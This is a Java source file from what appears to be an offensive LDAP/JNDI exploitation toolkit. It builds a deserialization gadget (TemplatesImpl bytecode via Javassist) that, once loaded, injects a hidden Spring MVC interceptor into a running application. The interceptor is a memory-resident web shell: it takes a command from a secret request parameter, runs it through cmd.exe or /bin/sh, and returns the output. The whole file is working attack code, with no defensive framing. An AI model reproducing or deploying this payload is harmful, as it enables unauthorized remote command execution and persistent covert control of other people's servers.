package com.idiot9.ldap.templates;

import com.idiot9.ldap.gadgets.utils.ClassFiles;
import com.idiot9.ldap.gadgets.utils.Reflections;
import com.idiot9.ldap.gadgets.utils.TemplatesCreator;
import com.idiot9.ldap.utils.Cache;
import javassist.*;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;

import javax.xml.transform.Templates;

public class SpringInterceptorTemplates implements TemplateFactory {
    private byte[] bytes;
    private String className;
    private String key;
    private Templates templates;


    public SpringInterceptorTemplates(String key) throws Exception {
        this.key = key;
        this.className = "BadInterceptor_within";
        createTemplatesImpl();
    }

//    public SpringInterceptorTemplates(String key, String className) {
//        this.key = key;
//        this.className = className;
//    }


    @Override
    public void createTemplatesImpl() throws CannotCompileException, Exception {
        Templates tpl = (Templates) tplClass.newInstance();

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(TemplateFactory.StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class));
        pool.insertClassPath(new ClassClassPath(AbstractHandlerMapping.class));
        pool.insertClassPath(new ClassClassPath(WebApplicationContext.class));
        pool.importPackage("com.sun.org.apache.xalan.internal.xsltc.runtime");
        pool.importPackage("javax.servlet.http");
        pool.importPackage("javax.servlet");
        pool.importPackage("java.io");
        pool.importPackage("org.springframework.web.context.request");

        CtClass ctClass = pool.get(TemplateFactory.StubTransletPayload.class.getName());

        ctClass.setName(this.className);

        CtMethod preHandle = CtNewMethod.make("public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n" +
                "        try {\n" +
                "            PrintWriter writer = response.getWriter();\n" +
                "            String arg0 = request.getParameter(\"" + this.key + "\");\n" +
                "            if (arg0 != null) {\n" +
                "                String o = \"\";\n" +
                "                ProcessBuilder p;\n" +
                "                if (System.getProperty(\"os.name\").toLowerCase().contains(\"win\")) {\n" +
                "                    p = new ProcessBuilder(new String[]{\"cmd.exe\", \"/c\", arg0});\n" +
                "                } else {\n" +
                "                    p = new ProcessBuilder(new String[]{\"/bin/sh\", \"-c\", arg0});\n" +
                "                }\n" +
                "                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(\"\\\\A\");\n" +
                "                o = c.hasNext() ? c.next() : o;\n" +
                "                c.close();\n" +
                "                writer.write(o);\n" +
                "                writer.flush();\n" +
                "                writer.close();\n" +
                "            }\n" +
                "            return false;\n" +
                "        } catch (IOException e) {\n" +
                "            throw new RuntimeException(e);\n" +
                "        }\n" +
                "    }", ctClass);
        ctClass.addMethod(preHandle);


        String static_block = "try {\n" +
                "            org.springframework.web.context.WebApplicationContext context = (org.springframework.web.context.WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0);\n" +
                "            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(\"requestMappingHandlerMapping\");\n" +
                "            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\");\n" +
                "            field.setAccessible(true);\n" +
                "            java.util.ArrayList adaptedInterceptors = (java.util.ArrayList) field.get(abstractHandlerMapping);\n" +
                "            BadInterceptor_within aaa = new " + this.className + "();\n" +
                "            adaptedInterceptors.add(aaa);\n" +
                "            System.out.println(\"Interceptor has been added\");\n" +
                "        }catch (java.lang.Exception e){}";

        ctClass.makeClassInitializer().insertAfter(static_block);




        CtClass superClass = pool.get(abstTranslet.getName());
        ctClass.setSuperclass(superClass);


        byte[] classBytes = ctClass.toBytecode();
        this.bytes = classBytes;


        Reflections.setFieldValue(tpl, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(TemplateFactory.Foo.class)});
        Reflections.setFieldValue(tpl, "_name", "1diot9");
        Reflections.setFieldValue(tpl, "_tfactory", transFactory.newInstance());

        this.templates = tpl;


    }

    @Override
    public String getClassName() {
        return this.className;
    }

    @Override
    public Templates getTemplates() {
        return this.templates;
    }

    @Override
    public void cache() throws Exception {
        Cache.set(this.className, this.bytes);
    }

    @Override
    public byte[] getBytes() {
        return this.bytes;
    }
}
